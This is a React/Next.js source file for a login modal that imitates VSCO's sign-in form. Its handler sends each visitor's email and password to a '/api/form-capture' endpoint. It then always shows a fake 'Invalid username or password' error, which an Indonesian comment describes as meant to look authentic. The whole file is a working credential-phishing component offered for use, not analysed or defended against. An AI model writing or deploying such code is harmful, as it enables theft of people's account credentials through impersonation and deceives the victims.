'use client';

import { X } from 'lucide-react';
import Link from 'next/link';
import { useState } from 'react';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSwitchToSignup: () => void;
}

export default function LoginModal({
  isOpen,
  onClose,
  onSwitchToSignup,
}: LoginModalProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!email || !password) {
      setError('Please enter both email and password.');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      // Kirim data login ke endpoint form capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'vsco',
          email,
          password,
          additional_data: {
            login_method: 'email',
            login_time: new Date().toISOString(),
          },
        }),
      });

      // Simulasi delay loading
      await new Promise((resolve) => setTimeout(resolve, 2000));

      // Tampilkan pesan error yang terlihat autentik
      setError('Invalid username or password. Please try again.');
    } catch (err) {
      setError('Something went wrong. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm'>
      <div className='relative w-full max-w-md rounded-xl border border-gray-800 bg-black p-8 shadow-2xl'>
        <button
          onClick={onClose}
          className='absolute right-6 top-6 text-gray-400 hover:text-white'
        >
          <X size={24} />
        </button>

        <div className='mb-8 text-center'>
          <div className='mb-6 flex justify-center'>
            <svg
              width='40'
              height='40'
              viewBox='0 0 24 24'
              fill='none'
              xmlns='http://www.w3.org/2000/svg'
            >
              <path
                d='M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM11 16H13V18H11V16ZM12.61 6.04C10.55 5.74 8.73 7.01 8.18 8.83C8 9.41 8.44 10 9.05 10H9.25C9.66 10 9.99 9.71 10.13 9.33C10.45 8.44 11.4 7.83 12.43 8.05C13.38 8.25 14.08 9.18 14 10.15C13.9 11.49 12.38 11.78 11.55 13.03C11.55 13.04 11.54 13.04 11.54 13.05C11.53 13.07 11.52 13.08 11.51 13.1C11.42 13.25 11.33 13.42 11.26 13.6C11.25 13.63 11.23 13.65 11.22 13.68C11.21 13.7 11.21 13.72 11.2 13.75C11.08 14.09 11 14.5 11 15H13C13 14.58 13.11 14.23 13.28 13.93C13.3 13.9 13.31 13.87 13.33 13.84C13.41 13.7 13.51 13.57 13.61 13.45C13.62 13.44 13.63 13.42 13.64 13.41C13.74 13.29 13.85 13.18 13.97 13.07C14.93 12.16 16.23 11.42 15.96 9.51C15.72 7.77 14.35 6.3 12.61 6.04Z'
                fill='white'
              />
            </svg>
          </div>
          <h2 className='text-xl font-semibold text-white'>Log in to VSCO</h2>
        </div>

        {error && (
          <div className='mb-6 rounded-lg border border-red-800/50 bg-red-900/30 p-3 text-sm text-red-300'>
            {error}
          </div>
        )}

        <form onSubmit={handleLogin} className='space-y-5'>
          <div>
            <input
              type='email'
              placeholder='Email'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>

          <div>
            <input
              type='password'
              placeholder='Password'
              className='w-full rounded-lg border border-gray-700 bg-gray-900/50 p-3 text-white focus:border-transparent focus:outline-none focus:ring-2 focus:ring-gray-600'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>

          <button
            type='submit'
            className={`w-full rounded-lg p-3 font-medium ${
              isLoading
                ? 'cursor-not-allowed bg-gray-700 text-gray-300'
                : 'bg-white text-black transition-colors hover:bg-gray-200'
            }`}
            disabled={isLoading}
          >
            {isLoading ? 'Logging in...' : 'Log In'}
          </button>

          <div className='text-center'>
            <Link
              href='#'
              className='text-sm text-gray-400 hover:text-white hover:underline'
            >
              Forgot your password?
            </Link>
          </div>
        </form>

        <div className='mt-8 border-t border-gray-800 pt-6 text-center'>
          <p className='mb-4 text-gray-400'>Don't have an account?</p>
          <button
            onClick={onSwitchToSignup}
            className='w-full rounded-lg border border-gray-600 bg-transparent p-3 font-medium text-white transition-colors hover:bg-gray-800'
          >
            Sign Up
          </button>
        </div>
      </div>
    </div>
  );
}
